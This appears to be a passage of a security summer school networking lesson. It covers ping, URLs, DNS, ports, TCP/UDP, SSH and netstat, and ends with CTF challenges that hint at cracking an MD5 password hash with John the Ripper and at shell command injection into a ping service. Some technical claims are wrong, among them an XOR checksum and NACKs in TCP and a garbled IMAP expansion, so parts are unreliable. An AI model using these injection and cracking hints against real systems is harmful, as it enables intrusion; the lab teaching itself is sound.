&lt;code>ping&lt;/code> sends packets to the given host (IP or website) and reports whether the host responds or not.
If it responds, it&amp;rsquo;s obviously alive.
Otherwise&amp;hellip; it&amp;rsquo;s complicated.
It can either be dead itself, &lt;strong>or there can be no route to it&lt;/strong>.
If we consider that the connection between us and our pinged host is &lt;em>mediated&lt;/em> by a chain of routers, as shown in the image above, if &lt;strong>one&lt;/strong> of those routers is down and doesn&amp;rsquo;t transmit packets, then we may be unable to reach the pinged host.
So a better wording is to say that when a host doesn&amp;rsquo;t respond to pings, it&amp;rsquo;s not necessarily &lt;em>down&lt;/em>, but merely &lt;strong>unreachable&lt;/strong>.
From a host&amp;rsquo;s point of view though, it&amp;rsquo;s irrelevant whether a host is down for real or not.
An unreachable host is as good as a dead one: &lt;em>useless&lt;/em>.&lt;/p>
&lt;p>&lt;code>localhost&lt;/code>, in other words. the &lt;code>lo&lt;/code> interface, should &lt;strong>always&lt;/strong> be up and respond to pings.
In case it doesn&amp;rsquo;t, well&amp;hellip; your kernel&amp;rsquo;s TCP/IP stack may be broken.
We use the &lt;code>-c 3&lt;/code> parameter to only send 3 &amp;ldquo;pings&amp;rdquo; to &lt;code>localhost&lt;/code>.
Otherwise, &lt;code>ping&lt;/code> sends packets continuously, until stopped manually (with &lt;code>ctrl + c&lt;/code>).&lt;/p>
&lt;pre tabindex="0">&lt;code>┌──(kali㉿kali)-[~]
└─$ ping -c 3 127.0.0.1
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.060 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.046 ms
--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2053ms
rtt min/avg/max/mdev = 0.040/0.048/0.060/0.008 ms
&lt;/code>&lt;/pre>&lt;p>&lt;code>ping&lt;/code> also tells us the RTT to the pinged host.
Notice the very small times when pinging ourselves.
This makes sense, since there are no hops (routers) between a host and itself.&lt;/p>
&lt;p>Now let&amp;rsquo;s ping a remote server, say &lt;code>google.com&lt;/code>.
We can &lt;code>ping&lt;/code> either an IP or a URL.&lt;/p>
&lt;pre tabindex="0">&lt;code>┌──(kali㉿kali)-[~]
└─$ ping -c 3 google.com
PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.
64 bytes from 8.8.8.8: icmp_seq=1 ttl=63 time=39.0 ms
64 bytes from 8.8.8.8: icmp_seq=2 ttl=63 time=50.1 ms
64 bytes from 8.8.8.8: icmp_seq=3 ttl=63 time=44.6 ms
--- 8.8.8.8 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 39.031/44.556/50.078/4.509 ms
&lt;/code>&lt;/pre>&lt;p>Now the RTTs are longer, because of the routing taking place between our VM and &lt;code>google.com&lt;/code>.
The more routers on the way, the longer the RTT.&lt;/p>
&lt;h3 id="urls">URLs&lt;/h3>
&lt;p>In the above &lt;code>ping&lt;/code> command, we used &lt;code>google.com&lt;/code> instead of an IP.
But what exactly are strings such as &lt;code>https://www.youtube.com&lt;/code> or &lt;code>https://www.google.com&lt;/code>?&lt;/p>
&lt;p>&lt;strong>Uniform Resource Locators (URLs)&lt;/strong> are exactly what their name implies: addresses to given resources on the Web.
This means that each URL can point to &lt;em>at most&lt;/em> one resource (some URLs are invalid and, thus, point to no resources).
Such resources can be HTML pages, images, videos and many others.&lt;/p>
&lt;p>Here are some examples of URLs:&lt;/p>
&lt;ul>
&lt;li>&lt;code>https://security-summer-school.github.io&lt;/code>&lt;/li>
&lt;li>&lt;code>https://github.com/security-summer-school/essentials/blob/master/explaining-the-internet/README.md&lt;/code>&lt;/li>
&lt;li>&lt;code>https://www.google.com/search?q=security+summer+school&lt;/code>&lt;/li>
&lt;/ul>
&lt;p>You&amp;rsquo;ve probably figured out that these URLs look somewhat similar.
They all start with &lt;code>https://&lt;/code>, they look like paths in the file system, separated by &lt;code>/&lt;/code>, they use some special characters such as &lt;code>?&lt;/code> and &lt;code>+&lt;/code>.
In the next section, we&amp;rsquo;ll explain all of these components.&lt;/p>
&lt;h4 id="anatomy-of-a-url">Anatomy of a URL&lt;/h4>
&lt;p>The image below summarises the building blocks of a URL&lt;/p>
&lt;p>&lt;img src="./assets/url_anatomy.png" alt="Anatomy of a URL">&lt;/p>
&lt;p>Let&amp;rsquo;s disect these components:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>The scheme&lt;/strong> (sometimes called &lt;em>schema&lt;/em>) indicates the application layer protocol that the browser must use to request the resource.
Usually, for websites, the protocol is HTTP (unsecured) or HTTPS (secured).
We&amp;rsquo;ll get into the details of HTTP in the &lt;a href="../rediscovering-the-browser">next session&lt;/a>.
Other schemes include &lt;code>ftp&lt;/code> (File Transfer Protocol), &lt;code>git&lt;/code>, &lt;code>mailto&lt;/code> etc.&lt;/li>
&lt;li>&lt;strong>The authority&lt;/strong> is separated from the scheme by the characters &lt;code>://&lt;/code>
It includes both the domain (in our case: &lt;code>www.example.com&lt;/code>) and the port (&lt;code>80&lt;/code>), separated by a colon:
&lt;ul>
&lt;li>&lt;strong>The domain&lt;/strong> indicates which Web server is being requested.
Usually this is a domain name, but an IP address may also be used (as you&amp;rsquo;ve seen when solving our challenges).&lt;/li>
&lt;li>&lt;strong>The port&lt;/strong> indicates the technical &lt;em>gate&lt;/em> used to access the resources on the web server.
It is usually omitted if the web server uses the standard ports of the HTTP protocol (80 for HTTP and 443 for HTTPS) to grant access to its resources.
We&amp;rsquo;ll explain this concept in further detail in the &lt;a href="#the-transport-layer">Transport Layer&lt;/a> section.&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>The path&lt;/strong> to the resource was, in the early days of the Internet, a physical file location on the web server.
Nowadays, it is mostly an abstraction handled by web servers without any mandatory physical reality.&lt;/li>
&lt;li>&lt;strong>The parameters&lt;/strong> are like function parameters, but they are passed to the web server itself.
Those parameters are a list of key - value pairs separated with the &lt;code>&amp;amp;&lt;/code> symbol.
The web server can use those parameters to do extra stuff before returning the resource.
Each web server has its own rules regarding parameters.
Once again, we&amp;rsquo;ll learn more about these parameters, more commonly known as &lt;strong>query parameters&lt;/strong> in the &lt;a href="../rediscovering-the-browser">next session&lt;/a>.&lt;/li>
&lt;li>&lt;strong>The anchor&lt;/strong>, also known as &lt;strong>fragment&lt;/strong>, is like a &lt;em>bookmark&lt;/em> to some specific part of the resource.
It gives the browser directions to show the content located at that &lt;em>bookmarked&lt;/em> spot.
On an HTML document, for example, the browser will scroll to the point where the anchor is defined; on a video or audio document, the browser will try to go to the time the anchor represents.
Markdown documents also use anchors, like so: &lt;a href="https://github.com/security-summer-school/essentials/tree/master/explaining-the-internet#anatomy-of-a-url">https://github.com/security-summer-school/essentials/tree/master/explaining-the-internet#anatomy-of-a-url&lt;/a>.&lt;/li>
&lt;/ul>
&lt;p>You might have heard the same things being called &lt;em>Uniform Resource Identifiers (URIs)&lt;/em>.
This is correct, but it&amp;rsquo;s not the most precise name you can use.
In order to understand the difference between URLs and URIs, check out their &lt;a href="#url-vs-uri">corresponding section&lt;/a>.&lt;/p>
&lt;p>We&amp;rsquo;ll see how URLs are translated into IPs by a naming system called the &lt;strong>Domanin Name System (DNS)&lt;/strong>.&lt;/p>
&lt;h3 id="the-domain-name-system">The Domain Name System&lt;/h3>
&lt;p>Remember: IPs, &lt;strong>not URLs&lt;/strong>, are what&amp;rsquo;s used to identify hosts (web servers included) on the Internet.
So there needs to be a service by which the URLs we&amp;rsquo;ve just learned about are mapped to IPs.
This service is called the DNS.
It organises URLs in a hierarchical manner, in order to rapidly respond to queries.
You can think of the DNS as being similar to a &lt;strong>phonebook of the Internet&lt;/strong>.&lt;/p>
&lt;p>Here&amp;rsquo;s how all of this works.
When you type &lt;code>security-summer-school.github.io&lt;/code> into your browser, it sends a query over the Internet in order to find the website associated with the URL &lt;code>security-summer-school.github.io&lt;/code>.
A query is a question asking to look up the domain name and respond to the corresponding IP address.
Let&amp;rsquo;s follow the path of this question across the Internet.&lt;/p>
&lt;p>In short, a DNS server performs the steps outlined &lt;a href="https://howdns.works/ep1/">here&lt;/a>.&lt;/p>
&lt;h4 id="the-recursive-resolver">The Recursive Resolver&lt;/h4>
&lt;p>The first server that the query interacts with is what&amp;rsquo;s called the &lt;strong>recursive resolver&lt;/strong>.
This resolver is often operated by your ISP.
It is a database of other DNS servers, which asks it forwards the same question: &amp;ldquo;What is the IP of &lt;code>security-summer-school.github.io&lt;/code>?&amp;rdquo;&lt;/p>
&lt;h4 id="the-root-server">The Root Server&lt;/h4>
&lt;p>The first DNS server that the recursive resolver talks to is the &lt;strong>root server&lt;/strong>.
These servers are responsible for translating &lt;em>top-level domains&lt;/em>, such as &lt;code>.io&lt;/code>, &lt;code>.com&lt;/code>, &lt;code>.net&lt;/code> etc.
These root servers are few in number (only 13 across the world) and are highly secured.&lt;/p>
&lt;h4 id="the-top-level-domain-name-server">The Top-Level Domain Name Server&lt;/h4>
&lt;p>The next entity that processes the query is the &lt;strong>Top-Level Domain (TLD) Name Server&lt;/strong>.
There are TLDs associated with each domain mentioned in the above section.
For instance, the search for &lt;code>security-summer-school.github.io&lt;/code> will be passed to the TLD responsible for the &lt;code>.io&lt;/code> domain.
This TLD will answer with &lt;code>.io&lt;/code>&amp;rsquo;s IP.&lt;/p>
&lt;h4 id="the-authoritative-name-servers">The Authoritative Name Server(s)&lt;/h4>
&lt;p>The last step in our lookup is &lt;strong>The Authoritative Name Servers&lt;/strong> (sometimes the &amp;ldquo;authoritative&amp;rdquo; part is omitted).
We use the plural &amp;ldquo;servers&amp;rdquo; because our query may be for a subdomain.
In fact, our query for &lt;code>security-summer-school.github&lt;/code> is one such case.
This means, that 2 name servers will fulfill the request.
The first server will fetch the IP of &lt;code>.github.io&lt;/code> and the second will fetch the IP of the whole query (&lt;code>security-summer-school.github.io&lt;/code>), by looking into the subdomains of &lt;code>.github.io&lt;/code>.
This server is symilar to a dictionary, in which a specific domain name is translated into its IP.&lt;/p>
&lt;h4 id="putting-it-together">Putting it Together&lt;/h4>
&lt;p>As you&amp;rsquo;ve probably noticed, the URLs are translated to IPs &lt;em>in reverse order&lt;/em>.
As a result, &lt;code>security-summer-school.github.io&lt;/code> is mapped to its IP in the order:&lt;/p>
&lt;ul>
&lt;li>&lt;code>.io&lt;/code>;&lt;/li>
&lt;li>&lt;code>.github&lt;/code>;&lt;/li>
&lt;li>&lt;code>security-summer-school&lt;/code>.&lt;/li>
&lt;/ul>
&lt;p>This makes sense, as this order gradually narrows the &lt;em>scope&lt;/em> in which the URL has to be searched.
It would be much more inefficient to look for &lt;code>security-summer-school&lt;/code> across the whole Internet, rather than limiting the search to the &lt;code>.github.io&lt;/code> domain.
The fact that we are able to perform queries in this manner is proof of the hierarchical nature of IP addresses.&lt;/p>
&lt;p>All in all, the DNS lookup for &lt;code>security-summer-school.github.io&lt;/code> is the one shown below.
Notice that the Recursive Resolver acts as a mediator between most of the DNS lookups.&lt;/p>
&lt;p>&lt;img src="./assets/dns_lookup.png" alt="DNS Lookup for security-summer-school.github.io">&lt;/p>
&lt;p>Notice that only the domain of a URL has its name resolved to an IP address.
The port, path, parameters and anchor are handled by the web server itself.
The DNS part is, thus, necessary in order to &lt;strong>find&lt;/strong> that web server.&lt;/p>
&lt;h4 id="host">&lt;code>host&lt;/code>&lt;/h4>
&lt;p>In the previous section we explained the DNS.
Now let&amp;rsquo;s put what we&amp;rsquo;ve just learned into practice.
In order to query the DNS service, we use the &lt;code>host&lt;/code> command.
It&amp;rsquo;s pretty straightforward:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# host security.summer.schoo.github.io
security.summer.schoo.github.io has address 185.199.108.153
security.summer.schoo.github.io has address 185.199.110.153
security.summer.schoo.github.io has address 185.199.109.153
security.summer.schoo.github.io has address 185.199.111.153
security.summer.schoo.github.io has IPv6 address 2606:50c0:8002::153
security.summer.schoo.github.io has IPv6 address 2606:50c0:8000::153
security.summer.schoo.github.io has IPv6 address 2606:50c0:8003::153
security.summer.schoo.github.io has IPv6 address 2606:50c0:8001::153
&lt;/code>&lt;/pre>&lt;p>Notice there are more IP&amp;rsquo;s for &lt;code>security.summer.schoo.github.io&lt;/code>.
The main reason for this is &lt;strong>load balancing&lt;/strong>.
Github is accessed frequently and in order not to overload a single server, it uses multiple servers for a single domain.
Obviously, each of them serve the same web page: &lt;code>security.summer.schoo.github.io&lt;/code>.
Github simply serves more machines to spread the workload.&lt;/p>
&lt;h2 id="the-transport-layer">The Transport Layer&lt;/h2>
&lt;p>So with IPs, we can connect two hosts however far apart they are.
So far, we managed to directly connect hosts.
Then we moved on to LANs and then to the whole Web.
This must be it, right?
We&amp;rsquo;re now worldwide.
Why all the fuss about the Transport Layer.
Let&amp;rsquo;s run an experiment: in your browser, open two tabs to your favourite website (which is &lt;a href="https://security-summer-school.github.io">https://security-summer-school.github.io&lt;/a>, of course).
How are those connections handled?
How come what you do in one of the tabs does not interfere with what you do in the other?
IPs give us connections from host to host, but they can&amp;rsquo;t differentiate between multiple connections between the same two hosts.&lt;/p>
&lt;p>For this, we need another concept: &lt;strong>ports&lt;/strong>.
The layer that implements these ports is called &lt;strong>the transport layer&lt;/strong>.&lt;/p>
&lt;p>The transport layer is the second layer of the protocol stack and sits immediately below the application layer.
At the transport layer there are two main protocols in use: &lt;strong>Transmission Control Protocol (TCP)&lt;/strong> and &lt;strong>User Datagram Protocol (UDP)&lt;/strong>.
More about them in just a bit.&lt;/p>
&lt;p>The transport layer accepts &lt;strong>messages&lt;/strong> from the application layer as application data.
It does not care if this data is part of the connection setup process, actual data to be transferred, or some other control message.
It just sees the data as a bunch of bytes to be transported to the receiving end&amp;rsquo;s transport layer.&lt;/p>
&lt;h3 id="ports">Ports&lt;/h3>
&lt;p>Generally speaking, ports are endpoints used for communication.
They have no physical correspondence, but are merely logical concepts used to segregate between different processes, all running on the same host.&lt;/p>
&lt;p>A port is a 16-bit number used in order to identify multiple network-using processes &lt;strong>on the same host&lt;/strong>.
Notice that with IPs we were talking about identifying &lt;em>hosts&lt;/em> whereas now we&amp;rsquo;ve increased the granularity and are talking about &lt;em>processes&lt;/em>
As a result, when a sender process wants to connect to another process (the receiver), it must specify both the port it&amp;rsquo;s currently using and the port used by the receiver.&lt;/p>
&lt;p>Since ports are numbers up to &lt;code>2^16&lt;/code>, this means there are 65536 of them.
This number is enough, given that it&amp;rsquo;s meant to encompass the network-using processes in the system.
However, not all of them are available for your average network application.
The &lt;strong>first 1024 (port numbers 0 to 1023)&lt;/strong> of them are reserved for common system applications and services.&lt;/p>
&lt;h3 id="tcp">TCP&lt;/h3>
&lt;p>The &amp;ldquo;Control&amp;rdquo; word in this protocol&amp;rsquo;s name should give us a hint that TCP is about handling various errors that may occur while a packet is traversing the Internet.
For this reason, TCP keeps track of the amount of data it sends and ensures it arrives in order (by buffering any out-of-order packets).
This type of tracking is made possible by the use of &lt;strong>sequence numbers (&lt;code>Seq&lt;/code>)&lt;/strong>.
In addition, the receiver sends a special message whenever it gets a segment.
This message is called &lt;strong>acknowledgement (ACK)&lt;/strong>.
Each ACK is sent together with an &lt;strong>ACK number&lt;/strong>.
This number signifies the amount of bytes received so far by the host.
It is used by the sender to figure out what portion of the data to send as part of the next segment.&lt;/p>
&lt;p>&lt;img src="./assets/tcp_ack_model.webp" alt="TCP ACKs in Action">&lt;/p>
&lt;p>In the above diagram we can see that the sender (client) adds some bytes (whose length is specified as &lt;code>Len&lt;/code>) to those already sent.
At the same time, the receiver (server) adds the newly arrived bytes to those received previously and sends this number back to the client as the ACK number.&lt;/p>
&lt;p>But some segments might arrive altered (some of their bits may be changed).
TCP adds what&amp;rsquo;s called a &lt;strong>checksum&lt;/strong> to each packet.
This checksum is computed by &lt;code>xor&lt;/code>-ing all bytes in the segment.
When a segment is received, its checksum is recomputed and compared to the one contained within it.
If the two checksums differ, the receiver notifies the sender by sending a &lt;strong>not ACK (NACK)&lt;/strong> segment instead of an ACK.
Upon receiving a NACK, the sender &lt;strong>retransmits&lt;/strong> the segment.
The same mechanism is employed for segments that do not make it to the receiver.&lt;/p>
&lt;p>In short, TCP makes sure that whatever is sent is received completely and correctly.
This feature is obviously important.
As a result, TCP is used for the transport-layer in the following application-level protocols and scenarios:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>SMTP (Simple Mail Transfer Protocol)&lt;/strong>, &lt;strong>IMAP (Internet Access Message Protocol)&lt;/strong> and &lt;strong>POP3 (Post Office Protocol version 3)&lt;/strong>: the main protocols used by email services worldwide.&lt;/li>
&lt;li>&lt;strong>HTTP/HTTPS (HyperText Transfer Protocol / Secured)&lt;/strong>: the most popular protocol used to transfer web pages.
By default, HTTP uses port 80 and HTTPS uses port 443.&lt;/li>
&lt;li>&lt;strong>SSH (Secure Shell)&lt;/strong>: a widely used protocol for obtaining a remote shell on another machine.&lt;/li>
&lt;/ul>
&lt;h4 id="ssh">SSH&lt;/h4>
&lt;p>We&amp;rsquo;ve been using &lt;code>ssh&lt;/code> to connect to the remote machines used for challenges and tutorials.
Now we know it is a protocol used for connecting to remote hosts via a shell.
It opens a TCP connection to the remote host, where each character typed in the terminal is sent to the receiving host.&lt;/p>
&lt;p>As its name suggests, the gist of this protocol is &lt;strong>secured&lt;/strong>.
The security implies that the characters are not sent to the receiver as plain text, but are &lt;strong>encrypted&lt;/strong>.
While we&amp;rsquo;ll discuss more about encryption in the &lt;a href="../data-security">Data Security&lt;/a> session, it is important that we outline the main workings of encryption.&lt;/p>
&lt;p>Upon initiating the SSH connection, an encryption algorithm is negociated between the communicating hosts.
This algorithm performs two operations: encryption and decryption&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Encryption&lt;/strong> transforms data (either keys pressed by the sender, or the output from the receiver) into bytes that look random (i.e. one cannot distingush an encrypted text and a random set of bytes).&lt;/li>
&lt;li>&lt;strong>Decryption&lt;/strong> performs the opposite operation: turns encrypted bytes into plain text.&lt;/li>
&lt;/ul>
&lt;p>The typical &lt;code>ssh&lt;/code> command looks like this:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ssh user@ip
&lt;/code>&lt;/pre>&lt;p>For example:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ssh student@141.85.224.100
&lt;/code>&lt;/pre>&lt;p>By default, SSH uses port 22.
We can specify another port by using the &lt;code>-p&lt;/code> parameter like so:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ssh user@ip -p port
&lt;/code>&lt;/pre>&lt;p>This is what you&amp;rsquo;ve been doing for the last 2 sessions in order to log onto our machines and solve challenges:&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# ssh ctf@ip -p &amp;lt;some_number&amp;gt;
&lt;/code>&lt;/pre>&lt;p>What you did is you created an SSH conection using a custom port which did not open a shell onto our full machines, but onto an individual &lt;a href="#containers">container&lt;/a> that was hosting each challenge.
Think of a container as a lighter, albeit less secure VM.
The architecture looks like this:&lt;/p>
&lt;p>&lt;img src="./assets/challenge_hosting_architecture.svg" alt="Challenge Hosting Architecture">&lt;/p>
&lt;h3 id="udp">UDP&lt;/h3>
&lt;p>We said TCP guarantees the correctness of the delivered data, which is great.
This guarantee, however, comes at the cost of performance.
In the picture above, we saw how ACKs are transmitted.
This mechanism causes a significant temporal overhead, that we sometimes simply cannot afford.
There are services that need to transfer data really fast and, thus, they forgo the need for &lt;strong>datagram&lt;/strong> correctness.
As the protocol&amp;rsquo;s name suggests, UDP messages are called datagrams.
If a received packet is incorrect or if it&amp;rsquo;s missing, well&amp;hellip; too bad.
Life moves on&amp;hellip; to the next packet and so on.
So applications usually simply discard incorrect or missing UDP datagrams.
In case you were wondering, UDP also computes the checksum, but provides no mechanism for error handling.
It&amp;rsquo;s up to the application layer to deal with them.&lt;/p>
&lt;p>In short, with UDP, the sender just sends its datagrams to the receiver.
Some might arrive out of order, or corrupted, but this is entirely the receiver&amp;rsquo;s problem.&lt;/p>
&lt;p>Moreover, with the wide implementation of optical fiber around the world, the possibility of datagrams being lost or corrupted has dropped to almost 0.
For this reason, UDP is mostly used for streaming services:&lt;/p>
&lt;ul>
&lt;li>YouTube&lt;/li>
&lt;li>Netflix&lt;/li>
&lt;li>Discord&lt;/li>
&lt;li>Spotify&lt;/li>
&lt;li>PornHub&lt;/li>
&lt;/ul>
&lt;p>Since an image is worth 1000 words, here&amp;rsquo;s a summary of TCP and UDP:&lt;/p>
&lt;p>&lt;img src="./assets/tcp_vs_udp.jpg" alt="TCP vs UDP">&lt;/p>
&lt;h2 id="the-application-layer">The Application Layer&lt;/h2>
&lt;p>The layer that is the closest to the user, the application layer is also the one that is hardest to define, since it denotes all network applications.
So we&amp;rsquo;ll try to list but a few examples of applications.
We&amp;rsquo;ve already mentioned some of them in the &lt;a href="#tcp">TCP&lt;/a> and &lt;a href="#udp">UDP&lt;/a> sections.&lt;/p>
&lt;p>In essence, every app that you use, and which has anything to do with the Internet, is implemented at the application layer.&lt;/p>
&lt;h3 id="netstat">&lt;code>netstat&lt;/code>&lt;/h3>
&lt;p>Netstat is a complex service used for inspecting various networking-related data.
We&amp;rsquo;ll be using it to list the services running on a host.
Now let&amp;rsquo;s test our own Kali Linux host.&lt;/p>
&lt;p>List all running services.
The &lt;code>-a&lt;/code> parameter stands for &amp;ldquo;all&amp;rdquo;.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# netstat -a | less
&lt;/code>&lt;/pre>&lt;p>That&amp;rsquo;s quite a lot of them.
Let&amp;rsquo;s trim them down a bit.
For example, let&amp;rsquo;s only list the services running TCP connections.
The &lt;code>-t&lt;/code> parameter stands for &amp;ldquo;TCP&amp;rdquo;.
Notice how we can concatenate parameters.
&lt;code>-a -t&lt;/code> is equivalent to &lt;code>-at&lt;/code> or &lt;code>-ta&lt;/code>.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# netstat -at | less
&lt;/code>&lt;/pre>&lt;p>Similarly, we can query all services using UDP connections:
As you might have guessed, UDP connections are listed using the &lt;code>-u&lt;/code> parameter.&lt;/p>
&lt;pre tabindex="0">&lt;code>root@kali:~# netstat -au # no need for `less` anymore
&lt;/code>&lt;/pre>&lt;p>Now let&amp;rsquo;s look for &lt;strong>servers&lt;/strong> specifically.
Usually a server waits for clients to connect to it and send requests.
We say the server &lt;strong>listens&lt;/strong> for connections.&lt;/p>
&lt;h3 id="challenge---who-is-111">Challenge - Who is 111?&lt;/h3>
&lt;p>Use the &lt;code>netstat&lt;/code>&amp;rsquo;s &lt;code>man&lt;/code> page and find the &lt;strong>name of the program&lt;/strong> that listens on port &lt;em>111&lt;/em>.
The flag of this challenge does &lt;strong>not&lt;/strong> respect the format &lt;code>SSS{...}&lt;/code>.&lt;/p>
&lt;h2 id="wrap-up">Wrap-up&lt;/h2>
&lt;p>The network stack up to and including the transport layer is implemented by the kernel of most operating systems.
This passes the burden of handling the lower layers of the TCP/IP stack to the OS, leaving the main logic to the application.
This is also helped by the fact that the protocols at the link, internet and transport layers are highly standardised, while there are no real constraints to how applications define protocols they use internally.&lt;/p>
&lt;h2 id="summary">Summary&lt;/h2>
&lt;p>We&amp;rsquo;ve used a lot of acronymes during this session.
Here they are explained once more, in case you missed some of them:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>ACK:&lt;/strong> Acknowledgement&lt;/li>
&lt;li>&lt;strong>(D)DoS:&lt;/strong> (Distributed) Denial of Service&lt;/li>
&lt;li>&lt;strong>DHCP:&lt;/strong> Dynamic Host Configuration Protocol&lt;/li>
&lt;li>&lt;strong>DNS:&lt;/strong> Domain Name System&lt;/li>
&lt;li>&lt;strong>HTML:&lt;/strong> HyperText Markup Language&lt;/li>
&lt;li>&lt;strong>HTTP(S):&lt;/strong> HyperText Transfer Protocol (Secured)&lt;/li>
&lt;li>&lt;strong>ICMP:&lt;/strong> Internet Control Message Protocol&lt;/li>
&lt;li>&lt;strong>IMAP:&lt;/strong> Internet Access Message Protocol&lt;/li>
&lt;li>&lt;strong>IP:&lt;/strong> Internet Protocol&lt;/li>
&lt;li>&lt;strong>ISP:&lt;/strong> Internet Service Provider&lt;/li>
&lt;li>&lt;strong>LAN:&lt;/strong> Local Area Network&lt;/li>
&lt;li>&lt;strong>MAC:&lt;/strong> Media Access Control&lt;/li>
&lt;li>&lt;strong>NACK:&lt;/strong> Not Acknowledged&lt;/li>
&lt;li>&lt;strong>NIC:&lt;/strong> Network Interface Card&lt;/li>
&lt;li>&lt;strong>OSI:&lt;/strong> Open Systems Interconnection&lt;/li>
&lt;li>&lt;strong>POP3:&lt;/strong> Post Office Protocol version 3&lt;/li>
&lt;li>&lt;strong>RTT:&lt;/strong> Round-Trip Time&lt;/li>
&lt;li>&lt;strong>SMTP:&lt;/strong> Simple Mail Transfer Protocol&lt;/li>
&lt;li>&lt;strong>SSH:&lt;/strong> Secure Shell&lt;/li>
&lt;li>&lt;strong>TCP:&lt;/strong> Transmission Control Protocol&lt;/li>
&lt;li>&lt;strong>TLD:&lt;/strong> Top-Level Domain&lt;/li>
&lt;li>&lt;strong>UDP:&lt;/strong> User Datagrem Protocol&lt;/li>
&lt;li>&lt;strong>URI:&lt;/strong> Uniform Resource Identifier&lt;/li>
&lt;li>&lt;strong>URL:&lt;/strong> Uniform Resource Locator&lt;/li>
&lt;/ul>
&lt;p>Here&amp;rsquo;s a short summary of the layers of the TCP/IP stack:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Link:&lt;/strong> Provides us with direct connections to other hosts.
Also adds identifiers to NICs in the form of MAC addresses.&lt;/li>
&lt;li>&lt;strong>Internet:&lt;/strong> Provides routing and identifiers for hosts in the Internet, in the form of IP addresses.&lt;/li>
&lt;li>&lt;strong>Transport:&lt;/strong> Provides connections between processes on different hosts by using ports.&lt;/li>
&lt;li>&lt;strong>Application:&lt;/strong> Composes the actual message to be delivered to the receiver.&lt;/li>
&lt;/ul>
&lt;p>Finally, let&amp;rsquo;s map some of the layers of the TCP/IP stack to the CLI tools we use for each of them:&lt;/p>
&lt;ul>
&lt;li>&lt;strong>Internet:&lt;/strong>
&lt;ul>
&lt;li>&lt;code>ping&lt;/code>&lt;/li>
&lt;li>&lt;code>dig&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Transport:&lt;/strong>
&lt;ul>
&lt;li>&lt;code>ssh&lt;/code>&lt;/li>
&lt;li>&lt;code>netcat&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>&lt;strong>Application:&lt;/strong>
&lt;ul>
&lt;li>&lt;code>netstat&lt;/code> (although it has &lt;a href="https://linux.die.net/man/8/netstat">many other uses&lt;/a>)&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;h2 id="activities">Activities&lt;/h2>
&lt;h3 id="challenge---they-see-me-running">Challenge - They See Me Running&lt;/h3>
&lt;p>There&amp;rsquo; s a quiz server running on the remote host.
Find the port on which the server is listening.
Then use &lt;code>netcat&lt;/code> (&lt;code>nc&lt;/code>) to &amp;ldquo;talk&amp;rdquo; to the server and answer its questions.
Upon a correct answer, the server will give you a flag.&lt;/p>
&lt;h3 id="challenge---unaccessible">Challenge - Unaccessible&lt;/h3>
&lt;p>Connect to the remote host via &lt;code>ssh&lt;/code> as user &lt;code>vuln&lt;/code> and get the flag.
If only you knew the password.
Up to now, the password was always &lt;code>ctf&lt;/code>.
This time, you have to find it yourselv
The file &lt;code>password.txt&lt;/code> that contains the MD5 hash of the password.
You can paste it on &lt;a href="https://crackstation.net/">crackstation&lt;/a>, but real hackers use &lt;a href="https://github.com/openwall/john">John the Ripper&lt;/a>.
Don&amp;rsquo;t chicken out and crack the password using &lt;code>john&lt;/code>.
We&amp;rsquo;ll come back to &lt;code>john&lt;/code> when we discuss &lt;a href="../data-security/">Data Security&lt;/a>.&lt;/p>
&lt;h3 id="challenge---pinger">Challenge - Pinger&lt;/h3>
&lt;p>The service can ping any IP by running the follwing command:&lt;/p>
&lt;pre tabindex="0">&lt;code>$ ping -c 1 &amp;lt;your input&amp;gt;
&lt;/code>&lt;/pre>&lt;p>Since your input is given directly to a shell command, you can be creative with how you use it.&lt;/p>
&lt;h2 id="further-reading">Further Reading&lt;/h2>
&lt;h3 id="the-osi-stack">The OSI Stack&lt;/h3>
&lt;p>In the session, we discussed the TCP/IP stack, which is implemented by the kernel of every Operating System (Linux included).
In the early days of the Internet, however, another model was popular.
This was the &lt;strong>OSI Model&lt;/strong>.
As a matter of fact, it&amp;rsquo;s still a popular model for teaching about the internet, because it makes a more rigorous separation of what we called the Application Layer.
This layer is split into 3, and the transmission medium is added as a separate physical layer, thus resulting a 7-layer stack.
You can learn about this alternative stack &lt;a href="https://www.imperva.com/learn/application-security/osi-model/">here&lt;/a>, but keep in mind that it is almost never used in practice.&lt;/p>
&lt;h3 id="the-networking-bible">The Networking Bible&lt;/h3>
&lt;p>Speaking of the OSI model, it is paramount that we mention the most influential book in computer networking to this day, namely Andrew Tanenbaum&amp;rsquo;s &lt;a href="http://index-of.es/Varios-2/Computer%20Networks%205th%20Edition.pdf">Computer Networks&lt;/a>.
Dating from 1981 (about the time these stacks were first defined), this book has been the cornerstone of networking ever since.
It&amp;rsquo;s a must-read for every netoworking enthusiast.&lt;/p>
&lt;h3 id="icmp">ICMP&lt;/h3>
&lt;p>The protocol used by &lt;code>ping&lt;/code> is called &lt;strong>Internet Control Message Protocol (ICMP)&lt;/strong>.
The protocol defines a set of &lt;em>utility&lt;/em> messages and responses, used by hosts in order to check the status of other hosts.&lt;/p>
